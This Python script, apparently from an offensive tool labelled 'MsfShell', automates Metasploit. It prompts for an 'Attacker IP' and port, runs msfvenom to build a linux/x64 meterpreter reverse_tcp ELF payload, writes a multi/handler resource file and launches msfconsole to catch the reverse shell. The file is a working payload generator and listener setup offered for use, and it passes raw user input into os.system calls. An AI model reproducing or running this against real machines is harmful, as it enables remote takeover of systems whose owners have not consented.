import os


banner="""

 /'\_/`\          /'___\ 
/\      \    ____/\ \__/ 
\ \ \__\ \  /',__\ \ ,__|
 \ \ \_/\ \/\__, `\ \ \_/                 
  \ \_\\ \_\/\____/\ \_\ 
   \/_/ \/_/\/___/  \/_/ 

/\  _`\ /\ \            /\_ \  /\_ \     
\ \,\L\_\ \ \___      __\//\ \ \//\ \    
 \/_\__ \\ \  _ `\  /'__`\\ \ \  \ \ \   
   /\ \L\ \ \ \ \ \/\  __/ \_\ \_ \_\ \_ 
   \ `\____\ \_\ \_\ \____\/\____\/\____|
    \/_____/\/_/\/_/\/____/\/____/\/____/

"""
def li64_tcp():
    os.system("clear")
    print(banner)
    print("Using: linux/x64/meterpreter/reverse_tcp")
    ip = input("Attacker IP: ")
    port = input("Listen Port: ")
    name = input("Name for the elf: ")
    print("Ok!")
    print("+--------------------------------------------+ ")
    print("+-> Payload data")
    print("+-> Payload: linux/x64/meterpreter/reverse_tcp")
    print("+-> Attacker IP: "+ip+"")
    print("+-> Listen Port: "+port+"")
    print("+-> Name: "+name+"")
    print("+--------------------------------------------+ ")
    print("Creating payload [01]")
    os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf >> "+name+".elf")
    print("Payload created! [01]")
    print("Payload saved in: "+name+".elf")
    print("Running metasploit-framework...")
    os.system("echo 'use exploit/multi/handler' >> linux64_tcp.rb")
    os.system("echo 'set LHOST "+ip+"' >> linux64_tcp.rb")
    os.system("echo 'set LPORT "+port+"' >> linux64_tcp.rb")
    os.system("echo 'set PAYLOAD linux/x64/meterpreter/reverse_tcp' >> linux64_tcp.rb")
    os.system("echo 'run' >> linux64_tcp.rb")
    os.system("gnome-terminal -- msfconsole -r linux64_tcp.rb &")
    input("Enter to return to the menu! ")
    os.system("clear")